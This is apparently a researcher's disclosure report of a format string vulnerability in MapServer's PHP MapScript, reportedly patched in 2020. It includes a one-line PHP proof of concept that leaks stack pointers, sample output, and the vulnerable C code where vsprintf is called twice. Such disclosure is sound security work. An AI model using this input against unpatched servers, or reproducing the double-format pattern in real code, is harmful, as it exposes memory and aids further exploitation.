>This is one of the reports that I sent privately to the MapServer Development Team in *Feb/28th/2020* The issues were patched: https://github.com/mapserver/mapserver/issues/6014

# Double-call to vsprintf() when printing PHP errors leading to a Format String attack

Double-call to ``vsprintf()`` when printing PHP errors leading to a Format String attack

## PoC
```
shaq@ubuntu:/tmp/phpfuzz$ php -r "ms_newmapobj('%p %p %p %p %p');"
```
will leak values from the stack.
output:
```
PHP Fatal error:  Uncaught exception 'MapScriptException' with message 
'Failed to open map file "0x1 0x100 0xb32785f4 0xbfa70a44 (nil)", or map file error.' in Command line code:1
Stack trace:
#0 Command line code(1): ms_newMapObj('%p %p %p %p %p')
#1 {main}
  thrown in Command line code on line 1
```
As can be seen above, the ``0x1 0x100 0xb32785f4 0xbfa70a44`` are the leaked values.

>Note: The example here is using PHP Command Line but I tested and it has the same behaviour in web application.

## Root cause
The issue is in ``mapscript_throw_mapserver_exception()``, this function takes a formatted string, passing it to ``vsprintf()`` and send the result as a parameter to ``mapscript_throw_exception()`` which **passes it to ``vsprintf()`` in the 2nd time**. And only then MapServer will print the error string.

The following steps demonstrates a practical exploitation of it from a PHP code perspective( using the PHP function ``ms_newMapObj()``:

1. An invalid value ("``%p %p %p %p %p``") is supplied to the ``ms_newMapObj()`` PHP function. The value we supplied is not valid, hence, it throws a PHP MapScript error using our vulnerable function:
   
(snippet from [mapserver/mapscript/php/php_mapscript.c](https://github.com/mapserver/mapserver/blob/368d71155fcddc7ba250cdad8821541f4d61619e/mapscript/php/php_mapscript.c))
```c
  if (map == NULL) {
    mapscript_throw_mapserver_exception("Failed to open map file \"%s\", or map file error." TSRMLS_CC,  filename);
    return;
  }
```
2. The ``mapscript_throw_mapserver_exception()`` function takes the formatted string, pass it to ``vsprintf()`` and then pass the result to ``mapscript_throw_exception()``

(snippet from [mapserver/mapscript/php/mapscript_error.c](https://github.com/mapserver/mapserver/blob/368d71155fcddc7ba250cdad8821541f4d61619e/mapscript/php/mapscript_error.c))

```c
  va_start(args, format);
  vsprintf(message, format, args);
  va_end(args);
  return mapscript_throw_exception(message TSRMLS_CC);
```

3. ``mapscript_throw_exception()`` calls ``vsprintf()`` **again**, which evaluates our malicious ``%p`` input and allow us to leak pointers from the stack. 
  
(snippet from [mapserver/mapscript/php/mapscript_error.c](https://github.com/mapserver/mapserver/blob/368d71155fcddc7ba250cdad8821541f4d61619e/mapscript/php/mapscript_error.c))
```c
#if  PHP_VERSION_ID >= 70000
zend_object* mapscript_throw_exception(char *format TSRMLS_DC, ...)
#else
zval* mapscript_throw_exception(char *format TSRMLS_DC, ...)
#endif
{
  va_list args;
  char message[MAX_EXCEPTION_MSG];
  va_start(args, format);
  vsprintf(message, format, args);
  va_end(args);
  return zend_throw_exception(mapscript_ce_mapscriptexception, message, 0 TSRMLS_CC);
}
```

4. profit :)

